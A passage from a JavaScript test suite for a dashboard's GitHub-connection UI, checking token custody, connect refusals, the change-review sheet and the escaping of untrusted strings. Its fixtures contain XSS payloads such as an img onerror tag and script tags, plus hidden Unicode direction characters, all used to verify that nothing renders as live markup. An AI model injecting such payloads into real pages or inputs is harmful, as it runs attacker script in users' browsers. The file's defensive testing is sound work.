// t_gh_ui.js — dashboard/aux_github.js, the GitHub sandbox UI (round 3,
// R3-GH3; docs/plans/github-sandbox-2026-10.md §1.2, §1.3, §4, §5.1, §7).
//
// The REAL aux_github.js runs in the mini DOM (_a11y_dom.js) against local
// route tables: no dashboard, no network, no model, no GitHub. A last
// scenario boots it on the REAL index.html (its esc(), toast() and HA()) with
// the REAL Settings shell, and the motion checks run the REAL aux_anim.js on
// the recording library stubs (_anim_stubs.js).
//
//   card      every state (not connected / connected / connector missing),
//             mounted in #sec-connections only, hostile strings escaped
//   token     never rendered, never kept, the field emptied on every attempt
//   connect   the §1.3 success and refusal copy, 400/403/409/network answers
//   actions   pause (strict boolean), revoke / disconnect (confirm), drift ack,
//             repo enable, X-Hermes-Nonce, Open GitHub (default browser only)
//   review    header, checks (a tick per warn ack), files, diff (escaped,
//             hidden characters visible, binary collapsed, truncated note),
//             approve gating, the digest + acks sent, every refusal handled,
//             Esc / close never decide, the focus trap, retract
//   toast     the 60 s poll rules, seeding, the toast click, the deep link
//   step      registration through the onboarding hook (before and after the
//             onboarding module), render/wire/save/statusRow/summary
//   motion    only through HermesAnim, instant under reduced motion
"use strict";
const fs = require("fs");
const path = require("path");
const { createWindow, bootDashboard, harness, Event } = require("./_a11y_dom.js");
const AS = require("./_anim_stubs.js");
const T = harness();
const REPO = process.env.HERMES_REPO || path.resolve(__dirname, "..", "..", "..");
const SRC = fs.readFileSync(path.join(REPO, "dashboard", "aux_github.js"), "utf8");
// the code without its comments (the header talks about localStorage, <header>…)
const CODE = SRC.replace(/\/\*[\s\S]*?\*\//g, "").split("\n").filter(function (l) { return !/^\s*\/\//.test(l); })
  .map(function (l) { return l.replace(/\s\/\/ .*$/, ""); }).join("\n");
const ANIM = fs.readFileSync(path.join(REPO, "dashboard", "aux_anim.js"), "utf8");
const INDEX = fs.readFileSync(path.join(REPO, "dashboard", "index.html"), "utf8");
// index.html's own esc(), so the suite escapes exactly like the page
const ESC_SRC = (INDEX.match(/^function esc\(s\)\{.*\}$/m) || [""])[0];

async function scenario(name, fn) {
  try { await fn(); } catch (e) {
    T.check(name + " (ran without throwing)", false, String(e && e.stack || e).split("\n").slice(0, 4).join(" | "));
  }
}
const NOW = Math.floor(Date.now() / 1000);
// obviously fake; never a real credential
const TOKEN = "github_pat_11FAKEFAKE0000_thisIsATestTokenNotARealOne0123456789zz";
const ID1 = "ghc-0123456789ab", ID2 = "ghc-ba9876543210", ID3 = "ghc-00000000ffff";
const HOSTILE = '<img src=x onerror=alert(1)>';

// ---------------------------------------------------------------------------
// fixtures
// ---------------------------------------------------------------------------
function statusOff(extra) {
  return Object.assign({ ok: true, connected: false, kind: null, login: null, repos: [], enabled: [],
    pending: 0, drift: [], attention: [], ambient: null, writes_paused: false,
    paused: { by_owner_switch: false, switch: null, holds: [] }, push_budget: { limit: 10, used: 0, left: 10 },
    check: { last: null, ok: null, error: null, next: null }, ruleset: {}, headline: "" }, extra || {});
}
function statusOn(extra) {
  return Object.assign({
    ok: true, connected: true, kind: "fine_grained_pat", login: "octo-owner", user_id: 42,
    expires_at: NOW + Math.round(29.5 * 86400), expires_in_days: 29.5, no_expiry: false,
    writes_paused: false, paused: { by_owner_switch: false, switch: null, holds: [] },
    repos: [
      { full_name: "octo-owner/site", private: true, default_branch: "main",
        protection: { state: "protected", text: "main protected: blocks force-push" },
        enabled: true, listed: true, writable: true, writes_ok: true, writes_blocked: null,
        sandbox: "/Users/you/HermesSandbox/github/octo-owner/site", prepared: true, last_check: NOW - 3600 },
      { full_name: "octo-owner/pub", private: false, default_branch: "trunk",
        protection: { state: "not_protected", text: "trunk not protected",
                      gap_text: "GitHub isn't enforcing rules on trunk for this repository." },
        enabled: false, listed: true, writable: true, writes_ok: false, writes_blocked: "not enabled",
        enable_blocked: null, sandbox: "/Users/you/HermesSandbox/github/octo-owner/pub", prepared: false }
    ],
    enabled: ["octo-owner/site"], pending: 0,
    drift: [{ repo: "octo-owner/site", branch: "hermes/odd", sha: "a".repeat(40), kind: "unknown",
              seen_at: NOW - 60, acked: false }],
    attention: [{ id: "drift:octo-owner/site:hermes/odd", level: "bad", since: NOW - 60, repo: "octo-owner/site",
                  text: "Something other than Hermes pushed to hermes/odd on octo-owner/site." }],
    ambient: null,
    push_budget: { limit: 10, used: 2, left: 8 },
    check: { last: NOW - 600, ok: true, error: null, next: NOW + 20000 },
    ruleset: { recommended: { name: "Hermes: protect the default branch", rules: [{ type: "deletion" }] },
               light: { name: "Hermes: no force-push or deletion", rules: [{ type: "non_fast_forward" }] },
               path: "Settings › Rules › Rulesets › New ruleset › Import a ruleset",
               text: "With this rule nobody, including you, can push straight to main." },
    headline: "Hermes keeps your GitHub key in a file only your account can read.",
    sandbox_root: "/Users/you/HermesSandbox/github"
  }, extra || {});
}
const AMBIENT = { checked_at: NOW - 30, any: true, gh: true, keychain: false, ssh: false, env: false,
  items: [
    { id: "gh", present: true, title: "GitHub CLI", detail: "The GitHub CLI is signed in. Any program can get its token with `gh auth token`.",
      commands: [{ label: "Sign it out", cmd: "gh auth logout --hostname github.com" }] },
    { id: "ssh", present: false, title: "SSH key", detail: "", commands: [] }],
  note: "Hermes only reads names and settings here.", accept_text: "Or accept it knowingly." };
function summary(id, extra) {
  return Object.assign({ id: id, repo: "octo-owner/pub", private: false, branch: "hermes/fix-copy", slug: "fix-copy",
    mode: "new", state: "pending", title: "Fix the copy", stat: { files: 3, add: 4, del: 1, bytes: 2500 },
    approvable: true, blocked: false, needs_ack: ["C-unicode", "C-unicode:2", "C-secret-shape", "C-binary"], confirm_public: true,
    requested_at: NOW - 300, expires_at: NOW + 80000, decided_at: null, decision: null, pushed_sha: null,
    pr: { number: null, url: null, draft: true }, error: null, default_branch: "main", parent: "b".repeat(40),
    source: "hub", retracted_at: null, review_url: "#github-review=" + id }, extra || {});
}
const DIFF = [
  "diff --git a/README.md b/README.md",
  "index 1111111..2222222 100644",
  "--- a/README.md",
  "+++ b/README.md",
  "@@ -1,2 +1,3 @@",
  " # Site",
  "-old line",
  "+<script>alert('diff')</script>",
  "+" + HOSTILE,
  "+abc\u202Edef\u200Bghi",
  "diff --git a/logo.png b/logo.png",
  "new file mode 100644",
  "index 0000000..3333333",
  "Binary files /dev/null and b/logo.png differ",
  ""
].join("\n");
function change(id, extra) {
  return Object.assign(summary(id), {
    title: "Fix " + HOSTILE + " `@octocat`",
    body: "Body <script>x()</script> with ``@team`` and \u27e6U+202E\u27e7 marker",
    checks: [
      { id: "C-unicode", level: "warn", ack: "C-unicode", text: "2 added lines contain hidden characters, shown as \u27e6U+\u2026\u27e7 in the samples.",
        samples: [{ path: "README.md", line: 3, sample: "abc\u27e6U+202E\u27e7def" }, { path: "src/<b>x</b>.js", line: 9, sample: HOSTILE }], total: 5 },
      { id: "C-unicode", level: "warn", ack: "C-unicode:2", text: "1 file name contains hidden characters (shown as \u27e6U+\u2026\u27e7).",
        samples: [{ path: "a\u27e6U+200B\u27e7b.txt", line: 0, sample: "a\u27e6U+200B\u27e7b.txt" }], total: 1 },
      { id: "C-secret-shape", level: "warn", ack: "C-secret-shape", text: "The description contains something shaped like a credential " + HOSTILE + "." },
      // what the merged server sends (aux_ghchanges.py, E02): every binary file
      // is a WARNING with its own ack, never an info row
      { id: "C-binary", level: "warn", ack: "C-binary", text: "logo.png is a binary file (2048 bytes, sha256 0123456789abcdef). " +
        "Its content is not in the diff and cannot be shown here: tick only if you know what this file is.", path: "logo.png",
        size: 2048, sha256: "0123456789abcdef".repeat(4), preview: false, preview_truncated: false },
      { id: "C-symlink", level: "info", text: "docs/latest is a symbolic link to v2.", path: "docs/latest" },
      { id: "C-public", level: "confirm", text: "I understand this is public. It is visible to everyone the moment it is pushed." }
    ],
    files: [
      { path: "README.md", old_path: null, status: "M", old_mode: "100644", new_mode: "100644", add: 3, del: 1, binary: false, size: 400 },
      { path: "logo.png", old_path: null, status: "A", old_mode: "000000", new_mode: "100644", add: null, del: null, binary: true, size: 2048 },
      { path: "src/" + HOSTILE + ".sh", old_path: "src/old.sh", status: "R", old_mode: "100644", new_mode: "100755", add: 1, del: 0, binary: false, size: 52 }
    ],
    diff: DIFF, diff_truncated: false, digest: "d".repeat(64), tree: "c".repeat(40), commit: "e".repeat(40),
    base: { branch: "main", sha: "abc1234" + "0".repeat(33), at: NOW - 7200 },
    pr_footer: "Opened by Hermes Assistant from a local sandbox, after you approved it on mac at <the time you approve>. Change " + id + ".",
    sanitized: { comments_stripped: 1, mentions: 2, title_cut: false, body_cut: false, hidden_chars: 0 },
    target_ref: "refs/heads/hermes/fix-copy", author: { name: "octo-owner", email: "42+octo-owner@users.noreply.github.com" }
  }, extra || {});
}

const BASE_HTML = "<!doctype html><html><head></head><body>" +
  '<header id="hdr"><button id="hdr-btn">menu</button></header>' +
  '<main id="view-mind"><section id="sec-connections" class="set-panel"><div class="set-body">' +
  "<div data-legacy-slot></div></div></section></main>" +
  '<button id="outside">outside</button>' +
  '<div class="toast" id="toast" role="status" aria-live="polite"></div>' +
  '<div id="onb-sheet"><div class="onb-body"></div><button type="button" class="onb-b onb-go">Continue</button></div>' +
  "</body></html>";

// a page: the mini DOM + index.html's esc() + a recording toast() + this file
async function page(o) {
  o = o || {};
  const w = createWindow({ html: o.html || BASE_HTML, media: o.media });
  w.__routes = Object.assign({ "/api/github/status": statusOff() }, o.routes || {});
  w.__defaultRoute = { __status: 404, body: { ok: false, error: "no route" } };
  w.__opened = [];
  w.open = function (u, t, f) { w.__opened.push([u, t, f]); return null; };
  w.__replaced = [];
  w.history.replaceState = function (s, t, u) { w.__replaced.push(u); w.location.hash = ""; };
  w.__logs = [];
  w.console = { log: function () { w.__logs.push([].slice.call(arguments).join(" ")); },
                warn: function () { w.__logs.push([].slice.call(arguments).join(" ")); },
                error: function () { w.__logs.push([].slice.call(arguments).join(" ")); },
                info: function () {}, debug: function () {} };
  if (o.hash) w.location.hash = o.hash;
  if (o.esc !== false) w.__run(ESC_SRC, "esc.js");
  w.__toasts = [];
  if (o.toast !== false) {
    w.__run("function toast(msg, ms){ var t = document.getElementById('toast'); __toasts.push([msg, ms]);" +
      " if (t) { t.textContent = msg; t.classList.add('on'); } }", "toast.js");
  }
  if (o.before) o.before(w);
  w.__run(SRC, "aux_github.js");
  await w.__tick(12);
  return w;
}
const G = function (w) { return w.hermesGitHub; };
function calls(w, p, method) {
  return w.__fetches.filter(function (f) {
    return f.url.split("?")[0] === p && (!method || ((f.init && f.init.method) || "GET") === method);
  });
}
function bodies(w, p) { return calls(w, p, "POST").map(function (f) { return JSON.parse(f.init.body || "{}"); }); }
function card(w) { return w.document.getElementById("mind-extra-github"); }
function sheet(w) { return w.document.getElementById("gh-review"); }
function txt(el) { return el ? el.textContent : ""; }
function html(el) { return el ? el.innerHTML : ""; }
async function mountCard(w) { await w.mindExtras(); await w.__tick(12); return card(w); }
function change_(el, v) { el.checked = !!v; el.dispatchEvent(new Event("change", { bubbles: true })); }
function input_(el, v) { el.value = v; el.dispatchEvent(new Event("input", { bubbles: true })); }
function deferred() { let res; const p = new Promise(function (r) { res = r; }); return { p: p, resolve: res }; }
// no LIVE markup from a hostile string: no element it could have created and
// no event-handler attribute (a string inside an attribute VALUE is inert, and
// innerHTML serialises it unescaped, so the string test alone would lie)
function liveMarkup(el) {
  const bad = [];
  if (!el) return bad;
  Array.from(el.querySelectorAll("*")).forEach(function (x) {
    if (/^(img|script|iframe|object|embed)$/.test(x.localName)) bad.push(x.localName);
    x.getAttributeNames().forEach(function (n) { if (/^on/.test(n)) bad.push(x.localName + "@" + n); });
  });
  return bad;
}
function noRaw(el) { return liveMarkup(el).length === 0 && html(el).indexOf("<script>") < 0; }
function everything(w) {      // every place a token could have leaked to
  return w.document.documentElement.outerHTML + "\n" + JSON.stringify(G(w).state) + "\n" +
    JSON.stringify(Array.from({ length: w.localStorage.length }, function (_, i) {
      return [w.localStorage.key(i), w.localStorage.getItem(w.localStorage.key(i))];
    })) + "\n" + w.__logs.join("\n");
}

(async function main() {
  console.log("aux_github.js: card, connect wizard, review sheet, toast poll, onboarding step");

  // =========================================================================
  await scenario("surface", async function () {
    const w = await page({ esc: false, toast: false });
    T.check("evaluates with no esc(), toast() or HermesAnim (typeof-guarded)", !!G(w) && G(w).v === 1);
    T.check("exposes openCard / openReview / connectHTML", typeof G(w).openCard === "function" &&
      typeof G(w).openReview === "function" && typeof G(w).connectHTML === "function");
    T.check("boot made ONE local status read and nothing else",
      w.__fetches.length === 1 && w.__fetches[0].url === "/api/github/status?scan=0", w.__fetches.map(function (f) { return f.url; }));
    T.check("not connected at boot: no poll timer", !w.__intervals.some(function (i) { return i.ms === 60000; }));
    w.__run(SRC, "aux_github.js (again)");
    T.check("a second eval is a no-op (no double mindExtras chain)", w.__fetches.length === 1);
    T.check("source has zero emoji", !/[\u{1F300}-\u{1FAFF}\u2600-\u27BF\u{1F000}-\u{1F2FF}]/u.test(SRC.replace(/\u27e6|\u27e7/g, "")));
    T.check("code never touches localStorage / sessionStorage", !/localStorage|sessionStorage/.test(CODE));
    T.check("code never logs", !/console\.(log|warn|error|info)/.test(CODE));
    // markup it WRITES never carries data-act (the onboarding sheet owns it); the one selector
    // that READS the sheet's own Skip button is `[data-act="skip"]`, with no space before it
    T.check("code writes no data-act attribute (the onboarding sheet owns it)", !/[\s"']data-act=/.test(CODE));
    T.check("...the only mention is the selector for the sheet's own Skip", (CODE.match(/data-act=/g) || []).length === 1 &&
      /\[data-act="skip"\]/.test(CODE));
    T.check("code never writes a <header>", !/<header/.test(CODE));
    T.check("motion only through HermesAnim (no direct Motion / gsap / anime / .animate)",
      !/\b(Motion|gsap|anime)\./.test(CODE) && !/\.animate\(/.test(CODE));
  });

  // =========================================================================
  await scenario("css laws", async function () {
    const w = await page({ routes: { "/api/github/status": statusOff() } });
    await mountCard(w);
    const css = w.document.getElementById("gh-css");
    const t = css ? css.textContent : "";
    T.check("one <style id=gh-css> in <head>", !!css && css.parentNode === w.document.head);
    T.check("no transition: all", !/transition\s*:\s*all/.test(t));
    T.check("explicit transition-property", /transition-property:/.test(t));
    T.check("OS reduced-motion block", /@media \(prefers-reduced-motion:reduce\)/.test(t));
    T.check("in-app reduce switch block", /:root\[data-reduce\] \.gh-b/.test(t));
    T.check("no theme token is re-declared (inherits index.html's palette)",
      !/--(ink|ground|iris|muted|faint|hairline|field|ok|warn|bad|glass|edge)\s*:/.test(t));
    T.check("the diff scrolls sideways and is monospace", /\.ghd-body\{overflow-x:auto\}/.test(t) && /\.ghd-l\{[^}]*monospace/.test(t));
    T.check("buttons are >=40px", /\.gh-b\{[^}]*min-height:40px/.test(t));
    await mountCard(w);
    T.check("re-mounting adds no second style", w.document.querySelectorAll("#gh-css").length === 1);
  });

  // =========================================================================
  await scenario("card: not connected", async function () {
    const w = await page({ routes: { "/api/github/status": statusOff() } });
    const c = await mountCard(w);
    const body = w.document.querySelector("#sec-connections .set-body");
    T.check("mounted inside #sec-connections .set-body", !!c && c.parentNode === body);
    T.check("...before the legacy slot", c && c.nextElementSibling && c.nextElementSibling.hasAttribute("data-legacy-slot"));
    T.check("card classes follow the Settings convention", c && c.className === "card glass set-legacy");
    const t = txt(c);
    const C = G(w).COPY;
    T.check("§1.3 paragraph 1", t.indexOf(C.p1) >= 0);
    T.check("§1.3 paragraph 2", t.indexOf(C.p2) >= 0);
    const lis = c.querySelectorAll("ol.ghc-steps li");
    T.check("§1.3 numbered list (3 items, bold words)", lis.length === 3 &&
      lis[0].textContent === "Open GitHub. The form is filled in for you." &&
      lis[1].querySelector("b").textContent === "Only select repositories" &&
      lis[2].querySelector("b").textContent === "Generate token");
    T.check("'Open GitHub to create the token'", !!c.querySelector('button[data-gh="open"]') &&
      txt(c.querySelector('button[data-gh="open"]')).trim() === "Open GitHub to create the token");
    T.check("'Check token'", txt(c.querySelector('button[data-gh="check"]')).trim() === "Check token");
    T.check("no Skip button in Settings", !c.querySelector('button[data-gh="skip"]'));
    const tok = c.querySelector("input[data-gh-token]");
    T.check("token field: password, autocomplete=off, spellcheck=false", !!tok && tok.getAttribute("type") === "password" &&
      tok.getAttribute("autocomplete") === "off" && tok.getAttribute("spellcheck") === "false");
    T.check("token label + placeholder + helper", t.indexOf("Token") >= 0 && tok.getAttribute("placeholder") === "github_pat_\u2026" &&
      t.indexOf("Stored only on this Mac, readable only by your account. Never shown again.") >= 0);
    const lab = c.querySelector('label[for="' + tok.id + '"]');
    T.check("the token field has a <label for>", !!lab && lab.textContent === "Token");
    T.check("repositories field (optional, one per line)", !!c.querySelector("textarea[data-gh-repos]") &&
      t.indexOf("Which repositories?") >= 0);
    T.check("not connected: no ambient/changes/access reads (no subprocess scan for nothing)",
      calls(w, "/api/github/ambient").length === 0 && calls(w, "/api/github/changes").length === 0 && calls(w, "/api/access").length === 0);
    T.check("not connected: no poll timer", !w.__intervals.some(function (i) { return i.ms === 60000; }));
  });

  await scenario("card: never in #view-mind, connector missing", async function () {
    const w = await page({ html: '<!doctype html><html><head></head><body><main id="view-mind"></main></body></html>' });
    await w.mindExtras(); await w.__tick(8);
    T.check("no #sec-connections yet: the card waits (never the #view-mind fallback)", !card(w));
    const w2 = await page({ routes: { "/api/github/status": { __status: 404, body: { ok: false } } } });
    const c2 = await mountCard(w2);
    T.check("route missing: says the connector is not loaded", /connector is not loaded/.test(txt(c2)));
  });

  // =========================================================================
  await scenario("card: connected", async function () {
    const st = statusOn({ pending: 1 });
    const w = await page({ routes: {
      "/api/github/status": st,
      "/api/github/ambient": { ok: true, ambient: AMBIENT },
      "/api/access": { dirs: ["/Users/you/HermesSandbox"] },
      "/api/github/changes": { ok: true, pending: 1, changes: [
        summary(ID1, { title: "Waiting one" }),
        summary(ID2, { state: "pr_open", title: "Pushed one", decided_at: NOW - 100, pushed_sha: "f".repeat(40),
          pr: { number: 12, url: "https://github.com/octo-owner/pub/pull/12", draft: true } }),
        summary(ID3, { state: "rejected", title: "Rejected one" })] }
    } });
    const c = await mountCard(w);
    const t = txt(c);
    T.check("account: @login", t.indexOf("@octo-owner") >= 0);
    const exp = G(w).fmt.dateLong(st.expires_at);
    T.check("expiry date + days", t.indexOf("Expires " + exp + " (in 29 days)") >= 0, t.match(/Expires[^)]*\)/));
    const sw = c.querySelector('input[data-gh="pause"]');
    T.check("Pause switch: a checkbox role=switch, off", !!sw && sw.getAttribute("role") === "switch" && !sw.checked);
    T.check("Disconnect / Revoke now / Check now", !!c.querySelector('button[data-gh="disconnect"]') &&
      !!c.querySelector('button[data-gh="revoke"]') && !!c.querySelector('button[data-gh="check-now"]'));
    T.check("pending badge", /1 waiting/.test(txt(c.querySelector("h2"))));
    T.check("the waiting change has a Review button", !!c.querySelector('button[data-gh="review"][data-id="' + ID1 + '"]'));
    T.check("Private chip + main protected", /octo-owner\/site\s*Private\s*main protected/.test(t), t.slice(0, 0));
    T.check("Public chip + trunk not protected + the gap text", /octo-owner\/pub\s*Public\s*trunk not protected/.test(t) &&
      t.indexOf("GitHub isn't enforcing rules on trunk") >= 0);
    T.check("sandbox path text", t.indexOf("/Users/you/HermesSandbox/github/octo-owner/site") >= 0);
    const fb = c.querySelectorAll('button[data-gh="finder"]');
    T.check("Show in Finder only for a prepared sandbox inside a granted folder", fb.length === 1 && fb[0].getAttribute("data-i") === "0");
    T.check("Enable for the not-enabled repo, Disable for the enabled one",
      !!c.querySelector('button[data-gh="repo-on"][data-i="1"]') && !!c.querySelector('button[data-gh="repo-off"][data-i="0"]'));
    T.check("recommended rule JSON + Copy + the GitHub path", t.indexOf('"Hermes: protect the default branch"') >= 0 &&
      !!c.querySelector('button[data-gh="copy-rule"]') && t.indexOf("Import a ruleset") >= 0);
    T.check("the lighter rule sits behind a disclosure", !!c.querySelector("details.gh-more") &&
      !!c.querySelector('button[data-gh="copy-light"]'));
    c.querySelector("details.gh-more").setAttribute("open", "");
    G(w).paintCard(true);
    T.check("a disclosure the owner opened stays open across a repaint", card(w).querySelector("details.gh-more").hasAttribute("open"));
    T.check("other GitHub access: the present finding + its command (from GET /api/github/ambient)",
      t.indexOf("GitHub CLI") >= 0 && t.indexOf("gh auth logout --hostname github.com") >= 0 &&
      calls(w, "/api/github/ambient").length === 1);
    T.check("...the absent one is not listed", t.indexOf("SSH key") < 0);
    // a probe that could not answer (present:null) is said, and "found nothing" is never claimed over it
    const ambU = { checked_at: NOW, items: [{ id: "gh", present: false, title: "GitHub CLI", detail: "", commands: [] },
      { id: "keychain", present: null, title: "git saved password",
        detail: "git is set to use the macOS Keychain helper; Hermes could not check whether a github.com password is saved.", commands: [] }],
      note: "Hermes only reads names and settings here." };
    const wU = await page({ routes: { "/api/github/status": statusOn({ drift: [], attention: [] }),
      "/api/github/ambient": { ok: true, ambient: ambU }, "/api/github/changes": { ok: true, changes: [] }, "/api/access": { dirs: [] } } });
    const cU = await mountCard(wU);
    T.check("an unanswered probe is listed as 'could not be checked' with its detail", /git saved password\s*— could not be checked\./.test(txt(cU)) &&
      /could not check whether a github\.com password is saved/.test(txt(cU)));
    T.check("...and 'found no other GitHub access' is NOT claimed over it", !/Hermes found no other GitHub access on this Mac:/.test(txt(cU)) &&
      /but not every place could be checked/.test(txt(cU)));
    T.check("...its `code` spans are <code>", !!c.querySelector(".gh-att code.gh-code"));
    T.check("drift alert + 'That was me'", t.indexOf("Something other than Hermes pushed") >= 0 &&
      !!c.querySelector('button[data-gh="drift-ack"][data-branch="hermes/odd"]'));
    T.check("recent pushes: the pushed change with its PR #12 link", t.indexOf("Pushed one") >= 0 &&
      !!c.querySelector('button[data-gh="link"][data-url="https://github.com/octo-owner/pub/pull/12"]'));
    T.check("recent pushes leave out a rejected change", t.indexOf("Rejected one") < 0);
    T.check("push budget line", t.indexOf("2 of 10") >= 0);
    T.check("12-hour clock everywhere", !/\b(1[3-9]|2[0-3]):[0-5]\d\b/.test(t) && /\d:\d\d (AM|PM)/.test(t));
    T.check("connected: the 60 s poll is running", w.__intervals.filter(function (i) { return i.ms === 60000; }).length === 1);
    T.check("no card inside a card", c.querySelectorAll(".card .card").length === 0);

    // PR link -> the default browser, the app window never navigates
    w.__click(c.querySelector('button[data-gh="link"]'));
    T.check("PR link opens through window.open(_blank, noopener)", w.__opened.length === 1 &&
      w.__opened[0][0] === "https://github.com/octo-owner/pub/pull/12" && w.__opened[0][1] === "_blank" &&
      w.__opened[0][2] === "noopener");
    T.check("...the app's own location is unchanged", w.location.href === "http://127.0.0.1:7788/");
    w.__routes["/api/files/reveal"] = { ok: true };
    w.__click(c.querySelector('button[data-gh="finder"]')); await w.__tick(8);
    T.check("Show in Finder posts the sandbox path to /api/files/reveal",
      bodies(w, "/api/files/reveal").length === 1 && bodies(w, "/api/files/reveal")[0].path === "/Users/you/HermesSandbox/github/octo-owner/site");
    let copied = null;
    w.navigator.clipboard.writeText = async function (s) { copied = s; };
    w.__click(c.querySelector('button[data-gh="copy-rule"]')); await w.__tick(6);
    T.check("Copy puts the rule JSON on the clipboard", copied && JSON.parse(copied).name === "Hermes: protect the default branch");
    w.__click(card(w).querySelector('button[data-gh="review"][data-id="' + ID1 + '"]')); await w.__tick(8);
    T.check("Review opens the sheet for that change", calls(w, "/api/github/changes").some(function (f) {
      return f.url === "/api/github/changes?id=" + ID1; }));
  });

  await scenario("card: hostile strings", async function () {
    const st = statusOn({ login: "<script>alert(9)</script>",
      repos: [{ full_name: "evil/" + HOSTILE, private: true, default_branch: "<b>x</b>", enabled: true, writes_ok: false,
        writes_blocked: HOSTILE, protection: { state: "protected", text: HOSTILE }, sandbox: "/tmp/" + HOSTILE, prepared: true }],
      attention: [{ id: "hold:permission", level: "bad", text: "held " + HOSTILE, since: NOW }],
      paused: { by_owner_switch: false, holds: [{ id: "permission", text: HOSTILE }] }, headline: HOSTILE });
    const amb = { items: [{ id: "gh", present: true, title: HOSTILE, detail: "a `" + HOSTILE + "` b",
      commands: [{ label: HOSTILE, cmd: "<script>alert(5)</script>" }] }], note: HOSTILE, accept_text: HOSTILE };
    const w = await page({ routes: { "/api/github/status": st, "/api/github/ambient": { ok: true, ambient: amb },
      "/api/github/changes": { ok: true, changes: [summary(ID1, { title: HOSTILE, repo: HOSTILE, branch: HOSTILE })] },
      "/api/access": { dirs: [] } } });
    const c = await mountCard(w);
    T.check("no live markup from any status / ambient / change string", noRaw(c), liveMarkup(c));
    T.check("...the text is still there, as text", txt(c).indexOf("<img src=x onerror=alert(1)>") >= 0 &&
      txt(c).indexOf("<script>alert(9)</script>") >= 0 && txt(c).indexOf("<script>alert(5)</script>") >= 0);
    T.check("no <b> came from a hostile default-branch name", txt(c).indexOf("<b>x</b>") >= 0);
  });

  // =========================================================================
  await scenario("connect: refusal, token custody", async function () {
    const hold = deferred();
    const w = await page({ routes: {
      "/api/github/status": statusOff(),
      "/api/github/connect": function () {
        return hold.p.then(function () {
          return { __status: 422, body: { ok: false, refused: true, retry: false, stored: false,
            findings: [{ id: "administration", level: "refuse", line: "It can change repository settings and branch rules (Administration). Remove that permission." }],
            lines: ["It can change repository settings and branch rules (Administration). Remove that permission.",
                    "It can add webhooks, which send repository events to other servers. Remove the Webhooks permission."],
            final: "Nothing was stored. Delete this token on GitHub (Settings › Developer settings › Personal access tokens › Fine-grained tokens) and create a new one with the button above." } };
        });
      } } });
    let c = await mountCard(w);
    input_(c.querySelector("textarea[data-gh-repos]"), "octo-owner/site\n octo-owner/pub ");
    const tok = c.querySelector("input[data-gh-token]");
    tok.focus();
    tok.value = TOKEN;
    w.__click(c.querySelector('button[data-gh="check"]'));
    await w.__tick(4);
    const live = card(w).querySelector("input[data-gh-token]");
    T.check("the field is empty while the check runs", !!live && live.value === "");
    T.check("...and the button says it is checking", /Checking with GitHub/.test(txt(card(w).querySelector('button[data-gh="check"]'))));
    const sent = bodies(w, "/api/github/connect");
    T.check("POST /api/github/connect {token, repos[]}", sent.length === 1 && sent[0].token === TOKEN &&
      JSON.stringify(sent[0].repos) === JSON.stringify(["octo-owner/site", "octo-owner/pub"]), sent);
    const cf = calls(w, "/api/github/connect", "POST")[0];
    T.check("...a same-origin JSON POST", cf.init.headers["Content-Type"] === "application/json" &&
      cf.init.credentials === "same-origin" && cf.url === "/api/github/connect");
    hold.resolve(); await w.__tick(10);
    c = card(w);
    const t = txt(c);
    T.check("refusal: one line per finding", t.indexOf("(Administration). Remove that permission.") >= 0 &&
      t.indexOf("Remove the Webhooks permission.") >= 0 && c.querySelectorAll(".ghc-panel.ref li").length === 2);
    T.check("refusal: then the final line", t.indexOf("Nothing was stored. Delete this token on GitHub") >= 0);
    T.check("after the refusal the field is empty", c.querySelector("input[data-gh-token]").value === "");
    T.check("the repositories text survives the repaint", c.querySelector("textarea[data-gh-repos]").value === "octo-owner/site\n octo-owner/pub ");
    T.check("the token appears nowhere: DOM, state, storage, logs", everything(w).indexOf(TOKEN) < 0 &&
      everything(w).indexOf(TOKEN.slice(11, 40)) < 0);
    const carrying = w.__fetches.filter(function (f) { return JSON.stringify(f).indexOf(TOKEN) >= 0; });
    T.check("exactly one request ever carried it: the connect POST", carrying.length === 1 && carrying[0].url === "/api/github/connect");
    T.check("never in a URL", !w.__fetches.some(function (f) { return f.url.indexOf("github_pat") >= 0; }));

    // empty field: no request
    w.__click(c.querySelector('button[data-gh="check"]')); await w.__tick(6);
    T.check("empty field: 'Paste the token first.' and no request", /Paste the token first/.test(txt(card(w))) &&
      calls(w, "/api/github/connect").length === 1);
    // Enter in the field checks
    w.__routes["/api/github/connect"] = { __status: 400, body: { ok: false, error: "too_long", hint: "This does not look like a GitHub fine-grained token." } };
    const f2 = card(w).querySelector("input[data-gh-token]");
    f2.value = TOKEN;
    w.__key(f2, "Enter"); await w.__tick(8);
    T.check("Enter in the token field runs Check token", calls(w, "/api/github/connect").length === 2);
    T.check("400: the hint is shown", /does not look like a GitHub fine-grained token/.test(txt(card(w))));
    T.check("400: the field is empty again", card(w).querySelector("input[data-gh-token]").value === "");
    // owner_only + network
    w.__routes["/api/github/connect"] = { __status: 403, body: { ok: false, error: "owner_only" } };
    card(w).querySelector("input[data-gh-token]").value = TOKEN;
    w.__click(card(w).querySelector('button[data-gh="check"]')); await w.__tick(8);
    T.check("403 owner_only: explains it must come from the Hermes window", /from the Hermes window itself/.test(txt(card(w))));
    w.__routes["/api/github/connect"] = { __reject: "offline" };
    card(w).querySelector("input[data-gh-token]").value = TOKEN;
    w.__click(card(w).querySelector('button[data-gh="check"]')); await w.__tick(8);
    T.check("network failure: nothing was stored, try again", /nothing was stored/.test(txt(card(w))) &&
      card(w).querySelector("input[data-gh-token]").value === "");
    T.check("after four attempts the token is still nowhere", everything(w).indexOf(TOKEN) < 0);
  });

  await scenario("connect: success panel (§1.3) and the connected card", async function () {
    const ok = statusOn({ stored: true, checks_passed: { write_reach: "none", administration: "absent", secrets: "absent",
      variables: "absent", webhooks: "absent", actions: "absent", contents_write: "verified", pull_requests: "ok",
      workflows: "not_observable" }, warnings: [], workflow_note: "Workflows cannot be checked through GitHub's API, so Hermes refuses any change to .github/workflows.",
      ambient: null, drift: [], attention: [] });
    const w = await page({ routes: { "/api/github/status": statusOff(), "/api/github/connect": ok,
      "/api/github/ambient": { ok: true, ambient: AMBIENT }, "/api/github/changes": { ok: true, changes: [] }, "/api/access": { dirs: [] } } });
    let c = await mountCard(w);
    c.querySelector("input[data-gh-token]").value = TOKEN;
    w.__click(c.querySelector('button[data-gh="check"]')); await w.__tick(14);
    c = card(w);
    const t = txt(c).replace(/\s+/g, " ");
    T.check("Connected as @login", t.indexOf("Connected as @octo-owner.") >= 0);
    T.check("This token can reach <n> repositories", t.indexOf("This token can reach 2 repositories:") >= 0);
    T.check("Private/Public + protected chips in the list", !!c.querySelector(".ghc-repos") &&
